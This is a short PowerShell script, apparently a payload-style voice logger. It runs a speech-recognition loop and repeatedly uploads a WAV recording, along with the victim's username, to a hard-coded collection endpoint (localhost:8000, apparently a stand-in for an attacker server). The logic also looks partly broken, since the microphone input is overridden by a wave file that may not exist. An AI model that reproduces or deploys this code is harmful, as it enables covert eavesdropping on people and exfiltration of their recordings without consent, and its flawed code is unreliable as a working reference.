function DC-Upload {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$filePath
    )

    $dc = 'http://localhost:8000'
    
    if (-not ([string]::IsNullOrEmpty($filePath)) -and (Test-Path $filePath)) {
        $Body = @{
            'username' = $env:username
        }
        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
        $boundary = [System.Guid]::NewGuid().ToString()
        $contentType = "multipart/form-data; boundary=$boundary"

        $fileHeader = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="$(Split-Path -Leaf $filePath)"
Content-Type: application/octet-stream

"@
        $fileFooter = "--$boundary--"

        $bodyBytes = ([Text.Encoding]::UTF8.GetBytes($fileHeader) + $fileBytes + [Text.Encoding]::UTF8.GetBytes($fileFooter))
        
        Invoke-RestMethod -ContentType $contentType -Uri $dc -Method Post -Body $bodyBytes
    }
}

function voiceLogger {
    Add-Type -AssemblyName System.Speech
    $recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine
    $grammar = New-Object System.Speech.Recognition.DictationGrammar
    $recognizer.LoadGrammar($grammar)
    $recognizer.SetInputToDefaultAudioDevice()

    $waveFilePath = "$env:tmp\VoiceLog.wav"
    
    # Set up a speech recognizer to record voice input
    $recognizer.SetInputToWaveFile($waveFilePath)
    
    while ($true) {
        $result = $recognizer.Recognize()
        if ($result) {
            Write-Output $result.Text

            # Send the WAV file to the server
            DC-Upload $waveFilePath

            # Convert the WAV file to MP4 (external tool needed, e.g., ffmpeg)
            # Example: & ffmpeg -i $waveFilePath "$env:tmp\VoiceLog.mp4"

            # Optional: Remove the WAV file after conversion
            # Remove-Item $waveFilePath

            switch -regex ($result.Text) {
                '\bnote\b' {saps notepad}
                '\bexit\b' {break}
            }
        }
    }
}

voiceLogger
